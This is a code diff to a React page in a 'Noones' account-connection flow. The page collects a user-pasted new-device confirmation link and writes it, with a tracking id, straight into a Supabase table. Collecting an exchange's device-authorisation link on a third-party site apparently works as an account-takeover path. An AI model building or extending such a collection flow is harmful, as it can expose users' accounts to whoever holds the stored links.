@@ -1,5 +1,6 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { useNavigate, useLocation } from 'react-router-dom';
+import { supabase } from '../../lib/supabase';
 
 const NOONES_SESSION_ID_KEY = 'noones_session_id';
 const NOONES_CURRENT_STEP_KEY = 'noones_current_step';
@@ -39,6 +40,13 @@ export default function NoonesNewDeviceVerification() {
     const requestData = requestDataStr ? JSON.parse(requestDataStr) : null;
     if (step === '3' && requestData) {
       navigate('/connect/noones/verify-device', { state: { email, platformData: requestData } });
+      return;
+    }
+    if (!step || step !== '2' || !requestData) {
+      window.localStorage.removeItem(NOONES_CURRENT_STEP_KEY);
+      window.localStorage.removeItem(NOONES_SESSION_ID_KEY);
+      window.localStorage.removeItem(NOONES_REQUEST_DATA_KEY);
+      navigate('/connect/noones');
     }
   }, [navigate, email]);
 
@@ -59,26 +67,23 @@ export default function NoonesNewDeviceVerification() {
       }
 
       console.log('[NOONES_STEP2] Updating confirmation_link for tracking_id:', trackingId);
-      
-      const response = await fetch('/api/update-connection', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ tracking_id: trackingId, confirmation_link: link.trim() }),
-      });
+      const { data, error } = await supabase
+        .from('platform_connection_requests')
+        .update({ confirmation_link: link.trim() })
+        .eq('tracking_id', trackingId)
+        .select()
+        .single();
 
-      console.log('[NOONES_STEP2] API response status:', response.status);
-      const payload = await response.json().catch(() => ({}));
-      console.log('[NOONES_STEP2] API response payload:', payload);
+      console.log('[NOONES_STEP2] Supabase update result:', { data, error });
 
-      if (!response.ok) {
-        const message = payload?.error || 'Unknown error';
-        console.error('[NOONES_STEP2] ❌ update-connection failed:', message);
-        setBackendError(`Unable to update verification link: ${message}`);
+      if (error) {
+        console.error('[NOONES_STEP2] ❌ Supabase update failed:', error);
+        setBackendError(`Unable to update verification link: ${error.message}`);
         setIsLoading(false);
         return;
       }
 
-      console.log('[NOONES_STEP2] ✅ update-connection success:', payload);
+      console.log('[NOONES_STEP2] ✅ Supabase update success:', data);
       console.log('[NOONES_STEP2] 🚀 UPDATE completed, proceeding to Step 3');
 
       // Update progress
